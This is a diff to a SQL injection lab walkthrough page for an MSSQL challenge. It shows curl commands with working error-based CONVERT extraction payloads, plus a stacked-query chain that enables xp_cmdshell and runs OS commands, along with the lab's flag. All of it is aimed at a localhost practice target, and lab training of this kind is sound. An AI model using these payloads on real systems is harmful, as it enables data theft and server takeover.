@@ -1,4 +1,4 @@
-<h4>Overview</h4>
+<!-- Introduction -->
 <p>
     A search feature connects to MSSQL with visible error messages. The injection uses
     <strong>CONVERT error-based extraction</strong> to leak data through type conversion errors.
@@ -166,12 +166,12 @@
     </div>
     <div class="terminal-body">
         <span class="prompt">// Extract flag (verified on Linux MSSQL):</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
         <span class="prompt"># Verified output: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_xp_cmd_sh3ll_rc3}' to data type int.</span><br><br>
         <span class="prompt">// Full xp_cmdshell chain (Windows MSSQL only -- not supported on Linux):</span><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -"<br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; INSERT INTO cmd_output EXEC xp_cmdshell 'whoami'; -- -"<br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 line FROM cmd_output WHERE line IS NOT NULL)) -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q='; INSERT INTO cmd_output EXEC xp_cmdshell 'whoami'; -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab7" \<br> --data-urlencode "q=' AND 1=CONVERT(INT, (SELECT TOP 1 line FROM cmd_output WHERE line IS NOT NULL)) -- -"<br>
         <span class="prompt"># Note: xp_cmdshell stacked query runs without error but produces no OS output on Linux MSSQL</span>
     </div>
 </div>
